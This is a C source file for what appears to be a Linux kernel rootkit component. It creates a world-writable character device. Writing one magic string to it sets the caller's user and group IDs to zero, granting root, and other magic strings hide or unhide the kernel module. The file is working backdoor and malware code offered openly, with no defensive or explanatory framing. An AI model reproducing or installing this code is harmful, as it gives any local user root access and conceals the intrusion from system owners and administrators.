#include <linux/device.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#include "device.h"
#include "hide.h"

static int major_number;
static struct class *dev_class;
static struct device *module_device;

static int dev_open(struct inode *inode, struct file *file) {
    return 0;
}

static ssize_t dev_read(struct file *file, char *buffer, size_t len, loff_t *offset) {
    return 0;
}

static int dev_release(struct inode *inode, struct file *file) {
    return 0;
}

static ssize_t dev_write(struct file *file, const char *buffer, size_t len, loff_t *offset) {
    int err = 0;

    char *data = kmalloc(MAX_MAGIC_LEN, GFP_KERNEL);
    if (!data) {
        return -ENOMEM;
    }

    if (len < MAX_MAGIC_LEN) {
        // The return value is not interesting to us.
        copy_from_user(data, buffer, len);
        data[len] = '\0';
    } else {
        copy_from_user(data, buffer, MAX_MAGIC_LEN);
        data[MAX_MAGIC_LEN - 1] = '\0';
    }

    if (!strcmp(data, ROOT_MAGIC)) {
        struct cred *new = prepare_creds();

        if (!new) {
            err = -ENOMEM;
        } else {
            // Grant root to the calling process.
            new->uid.val = new->gid.val = 0;
            new->euid.val = new->egid.val = 0;
            new->suid.val = new->sgid.val = 0;
            new->fsuid.val = new->fsgid.val = 0;

            commit_creds(new);
        }
    } else if (!strcmp(data, HIDE_MAGIC)) {
        err = hide_module();
    } else if (!strcmp(data, SHOW_MAGIC)) {
        err = show_module();
    }

    kfree(data);
    return err ? err : len;
}

static struct file_operations fops
    = {.owner = THIS_MODULE, .open = dev_open, .read = dev_read, .write = dev_write, .release = dev_release};

// https://stackoverflow.com/a/21774410
static int dev_uevent(struct device *dev, struct kobj_uevent_env *env) {
    add_uevent_var(env, "DEVMODE=%#o", 0666);
    return 0;
}

int init_device(void) {
    major_number = register_chrdev(0, DEVICE_NAME, &fops);
    if (major_number < 0) {
        return major_number;
    }

    dev_class = class_create(THIS_MODULE, DEVICE_NAME);
    if (IS_ERR(dev_class)) {
        unregister_chrdev(major_number, DEVICE_NAME);
        return PTR_ERR(dev_class);
    }

    dev_class->dev_uevent = dev_uevent;

    module_device = device_create(dev_class, NULL, MKDEV(major_number, 0), NULL, DEVICE_NAME);
    if (IS_ERR(module_device)) {
        class_destroy(dev_class);
        unregister_chrdev(major_number, DEVICE_NAME);
        return PTR_ERR(module_device);
    }

    return 0;
}

void rm_device(void) {
    device_destroy(dev_class, MKDEV(major_number, 0));
    class_unregister(dev_class);
    class_destroy(dev_class);
    unregister_chrdev(major_number, DEVICE_NAME);
}
